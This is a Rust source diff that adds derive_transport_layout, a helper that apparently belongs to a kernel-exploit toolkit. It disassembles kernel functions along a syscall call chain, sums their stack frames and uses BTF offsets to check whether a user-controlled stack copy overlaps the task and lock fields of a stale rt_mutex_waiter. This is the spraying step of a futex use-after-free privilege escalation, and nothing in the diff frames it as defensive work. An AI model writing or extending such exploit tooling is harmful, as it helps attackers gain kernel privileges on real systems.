@@ -864,3 +864,80 @@ mod fit_tests {
         assert!(!fit::pselect(-0x2F8));
     }
 }
+
+/// Generic transport check: does a user->stack copy in a known call chain cover
+/// the stale rt_mutex_waiter's task/lock fields?
+///
+/// Conventions are verbatim from derive_pselect_layout so the two agree:
+///   abspos(F, off) = -(sum of entry frames from a syscall entry down to and
+///   including F) + off, where the entry frames come from first_sp_frame.
+/// The waiter base abspos is FutexWaiter::depth (negative). task/lock live at
+/// depth + offsetof(rt_mutex_waiter, task|lock).
+///
+/// `chain` is the ordered call path from the syscall entry to the function that
+/// performs the copy. Each hop must be a unique symbol; the chain is not
+/// verified against disassembly calls here (validate the caller separately).
+pub struct TransportLayout {
+    /// Abspos of the copy buffer base (negative, below syscall entry).
+    pub buffer_abspos: i64,
+    pub buffer_size: u64,
+    /// Byte offset inside the buffer where task/lock land, if covered.
+    pub task_byte: Option<u64>,
+    pub lock_byte: Option<u64>,
+    /// Signed: how far (in positive-depth terms) the buffer base sits from the
+    /// waiter base. Negative = buffer starts above the waiter.
+    pub gap: i64,
+    pub chain_sum: u64,
+}
+
+pub fn derive_transport_layout(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted_offsets: &[u64],
+    btf: &Btf,
+    chain: &[&str],
+    copy_sp_offset: u64,
+    copy_size: u64,
+) -> Result<TransportLayout> {
+    let futex = derive_futex_waiter(kernel, symbols, sorted_offsets, btf)?;
+    let task_off = btf
+        .field("rt_mutex_waiter", "task")
+        .ok_or_else(|| ExtractError::new("BTF rt_mutex_waiter.task missing"))?
+        as i64;
+    let lock_off = btf
+        .field("rt_mutex_waiter", "lock")
+        .ok_or_else(|| ExtractError::new("BTF rt_mutex_waiter.lock missing"))?
+        as i64;
+    let mut sum = 0u64;
+    for name in chain {
+        let off = unique_or_err(symbols, name)?;
+        let stop = sorted_offsets
+            .iter()
+            .find(|v| **v > off)
+            .map_or(off + OBJDUMP_CAP as u64, |v| *v);
+        let lines = crate::disasm::disassemble_range(
+            kernel,
+            off as usize,
+            stop.min(off + OBJDUMP_CAP as u64) as usize,
+        )?;
+        sum += crate::disasm::first_sp_frame(&lines, name)?;
+    }
+    let buffer_abspos = -(sum as i64) + copy_sp_offset as i64;
+    let task_pos = futex.depth + task_off;
+    let lock_pos = futex.depth + lock_off;
+    let bytes = |pos: i64| -> Option<u64> {
+        if pos >= buffer_abspos && pos < buffer_abspos + copy_size as i64 {
+            Some((pos - buffer_abspos) as u64)
+        } else {
+            None
+        }
+    };
+    Ok(TransportLayout {
+        buffer_abspos,
+        buffer_size: copy_size,
+        task_byte: bytes(task_pos),
+        lock_byte: bytes(lock_pos),
+        gap: buffer_abspos - futex.depth,
+        chain_sum: sum,
+    })
+}
